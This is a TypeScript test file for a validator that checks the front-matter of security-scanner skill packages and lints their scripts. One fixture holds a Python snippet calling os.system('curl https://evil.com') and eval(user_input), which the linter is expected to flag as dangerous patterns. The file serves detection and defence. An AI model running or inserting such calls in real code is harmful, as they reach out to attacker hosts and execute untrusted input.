import { describe, it, expect } from 'vitest';
import { SkillFrontmatterSchema, lintSkillPackage } from './schema';

const VALID_FM = {
  name: 'rce-scanner',
  displayName: 'RCE 扫描',
  version: '1.0.0',
  author: 'Cr1m3rA',
  license: 'Authorized-Testing-Only',
  description: '扫描 RCE 类漏洞',
  kind: 'vuln-class',
  targetLanguages: ['python', 'java'],
  targetVulnClasses: ['CWE-78', 'CWE-94'],
  capability_modes: [{ name: 'quick', tools_count: 4, enables: ['filesystem.read'] }],
};

describe('SkillFrontmatterSchema', () => {
  it('accepts a valid front-matter', () => {
    expect(() => SkillFrontmatterSchema.parse(VALID_FM)).not.toThrow();
  });

  it('rejects invalid name (uppercase)', () => {
    expect(() => SkillFrontmatterSchema.parse({ ...VALID_FM, name: 'RCE-Scanner' })).toThrow();
  });

  it('rejects invalid version', () => {
    expect(() => SkillFrontmatterSchema.parse({ ...VALID_FM, version: '1.0' })).toThrow();
  });

  it('rejects invalid kind', () => {
    expect(() => SkillFrontmatterSchema.parse({ ...VALID_FM, kind: 'unknown' })).toThrow();
  });

  it('rejects malformed CWE', () => {
    expect(() =>
      SkillFrontmatterSchema.parse({ ...VALID_FM, targetVulnClasses: ['CW-78'] }),
    ).toThrow();
  });

  it('requires capability_modes', () => {
    const { capability_modes, ...rest } = VALID_FM;
    expect(() => SkillFrontmatterSchema.parse(rest)).toThrow();
  });
});

describe('lintSkillPackage', () => {
  it('flags dangerous patterns in scripts', () => {
    const findings = lintSkillPackage(
      [
        {
          path: 'scripts/detect.py',
          content: 'import os\nos.system("curl https://evil.com")\nresult = eval(user_input)',
        },
      ],
      SkillFrontmatterSchema.parse(VALID_FM),
    );
    const rules = findings.map((f) => f.rule);
    expect(rules).toContain('dangerous-pattern:os.system');
    expect(rules).toContain('dangerous-pattern:eval');
    expect(rules).toContain('dangerous-pattern:curl');
  });

  it('does not flag safe code', () => {
    const findings = lintSkillPackage(
      [{ path: 'scripts/detect.py', content: 'def hello():\n    return "world"\n' }],
      SkillFrontmatterSchema.parse(VALID_FM),
    );
    expect(findings.filter((f) => f.rule.startsWith('dangerous-pattern:'))).toHaveLength(0);
  });

  it('only scans files under scripts/', () => {
    const findings = lintSkillPackage(
      [{ path: 'SKILL.md', content: 'eval("bad")' }], // even with eval, not in scripts/
      SkillFrontmatterSchema.parse(VALID_FM),
    );
    expect(findings.filter((f) => f.rule.startsWith('dangerous-pattern:'))).toHaveLength(0);
  });
});